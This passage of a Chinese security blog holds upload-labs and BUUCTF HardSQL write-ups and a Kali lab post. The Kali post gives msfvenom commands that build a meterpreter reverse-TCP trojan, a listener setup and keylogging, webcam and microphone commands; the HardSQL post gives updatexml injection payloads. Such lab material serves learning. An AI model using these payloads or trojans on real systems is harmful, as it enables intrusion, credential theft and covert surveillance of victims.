<p>判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染，具体可以参考<a href="https://xz.aliyun.com/t/2657#toc-13">这篇文章</a>，可是在复现的时候还是因为二次渲染以后php代码还是出被修改。</p>
<h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324</span></span><br></pre></td></tr></table></figure>

<p>这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可<br><img src="https://img-blog.csdnimg.cn/20190619101858627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619101917177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> $dir </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190619104159629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
<p><img src="https://img-blog.csdnimg.cn/20190619120245814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619120306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19-00截断"></a>Pass-19-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526</span></span><br></pre></td></tr></table></figure>

<p>发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>
<p><img src="https://img-blog.csdnimg.cn/2019061912220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619122142117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190619122230333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 HardSQL</title>
    <url>/2021/08/30/buu/16/</url>
    <content><![CDATA[<h4 id="0x00知识点："><a href="#0x00知识点：" class="headerlink" title="0x00知识点："></a>0x00知识点：</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sql注入中的updatexml()函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure>

<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值</p>
<p>改变XML_document中符合XPATH_string的值</p>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>​            其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure>

<p>xpath语法总结：<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure>

<p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
<p>第一个参数可以传入目标xml文档</p>
<p>第二个参数是用Xpath路径法表示的查找路径</p>
<p>例子：</p>
<p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p>
<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p>
<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆出库</p>
<p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p>
<p>爆出表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p>
<p>爆出列名</p>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p>
<p>右边的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">补充：</span><br><span class="line"></span><br><span class="line">1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过</span><br><span class="line">2：&#x3D;号被过滤可以用like来绕过</span><br><span class="line">3：substring与mid被过滤可以用right与left来绕过</span><br></pre></td></tr></table></figure>



<h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">极客大挑战 2019]HardSQL_o3Ev的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>一次简单的kali渗透测试</title>
    <url>/2021/08/30/src/0830/</url>
    <content><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p>
<p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p>
<p>首先开启kali-2018</p>
<p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p>
<p>接着我们开始创建木马文件</p>
<p>输入以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的虚拟机ip地址 lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure>

<p>桌面会生成名为aaa.exe的木马文件</p>
<p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p>
<p>我们进入msfconsole</p>
<p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p>
<p>使用如下一系列指令：</p>
<p>使用exploit/multi/handler</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure>

<p>设置payload </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>

<p>设置木马监听回传ip地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set lhost 你的虚拟机的ip地址</span><br></pre></td></tr></table></figure>

<p>设置木马监听回传端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p>
<p>还可以用 show options来确认是否设置成功</p>
<p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p>
<p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p>
<p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p>
<p>可以看到建立了session</p>
<p>说明我们已经成功连上了靶机</p>
<p>试着运行一些指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p>
<p>查看了靶机的一些信息</p>
<p>此外还有的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getuid    获取系统ID以及计算机名称</span><br><span class="line">kill    中止进程</span><br><span class="line">ps    列举正在运行中的进程</span><br><span class="line">getpid    获取当前进程标识符</span><br><span class="line">keyscan_start     开启按键记录会话</span><br><span class="line">keyscan_stop     终止按键记录会话</span><br><span class="line">keyscan_dump   转储从被攻击主机捕获到的按键</span><br><span class="line">enumdesktops    列举所有可访问到的桌面和工作站</span><br><span class="line">getdesktop    获取当前meterpreter桌面</span><br><span class="line">setdesktop    变更meterpreter当前桌面</span><br><span class="line">webcam_list   列举系统中所有的摄像头</span><br><span class="line">webcam_snap   捕获被攻击主机的快照</span><br><span class="line">record_mic    从主机的默认麦克风中记录环境声音</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到更为高级的免杀木马文章：</p>
<p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p>
<h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>今天找到另外一篇文章来获取shell</p>
<p>操作方法差不多</p>
<p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kali利用MSF渗透Win 7获取shell_舞指如歌~的博客-CSDN博客</a></p>
<p>这次不懂为什么文件复制不到win7上，索性就用了物理机来试验</p>
<p><a href="https://blog.csdn.net/u012206617/article/details/97389338">获取Shell（提权）后的操作（windows、Linux）_墨痕诉清风的博客-CSDN博客_shell提权</a></p>
<p>这时候之前的一篇安全客文章就讲的十分详细了</p>
<p><a href="https://www.anquanke.com/post/id/235631">MSF使用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计(一)</title>
    <url>/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p> <strong>文章内容来自于：安恒信息</strong></p>
<h3 id="通用代码审计思路："><a href="#通用代码审计思路：" class="headerlink" title="通用代码审计思路："></a>通用代码审计思路：</h3><h4 id="1-根据敏感关键字回溯参数传递过程-逆向追踪"><a href="#1-根据敏感关键字回溯参数传递过程-逆向追踪" class="headerlink" title="1.根据敏感关键字回溯参数传递过程(逆向追踪)"></a>1.根据敏感关键字回溯参数传递过程(逆向追踪)</h4><p>​            检查敏感函数的参数，进行回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。</p>
<h4 id="2-寻找可控参数，正向追踪变量传递过程-正向追踪"><a href="#2-寻找可控参数，正向追踪变量传递过程-正向追踪" class="headerlink" title="2.寻找可控参数，正向追踪变量传递过程(正向追踪)"></a>2.寻找可控参数，正向追踪变量传递过程(正向追踪)</h4><p>​            跟踪传递的参数，判断是否存入到敏感函数内或者传递的过程中具有代码逻辑漏洞。</p>
<h4 id="3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞"><a href="#3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞" class="headerlink" title="3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)"></a>3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)</h4><p>​            根据自身经验判断在该应用中的哪些功能可能出现漏洞。</p>
<h4 id="4-直接通读全文代码"><a href="#4-直接通读全文代码" class="headerlink" title="4.直接通读全文代码"></a>4.直接通读全文代码</h4><h3 id="敏感函数回溯审计："><a href="#敏感函数回溯审计：" class="headerlink" title="敏感函数回溯审计："></a>敏感函数回溯审计：</h3><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p>
<h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p>
<p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p>
<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>php弱类型</p>
<h4 id="1-比较符号"><a href="#1-比较符号" class="headerlink" title="1.比较符号"></a>1.比较符号</h4><p>==            先进行类型转化，再进行比较（弱比较）</p>
<p>===          先比较类型，若类型不同直接返回不等（强比较）</p>
<p>Tips</p>
<p>Bool类型的true和任意字符串的弱类型相等</p>
<p>数字与字符串相比较，会将字符串转化为数字</p>
<p>若字符串以数字开头，则取开头数字作为转化结果，</p>
<p>若无则转化为0，若符合科学记数法的形式，则按照科学记数法来取</p>
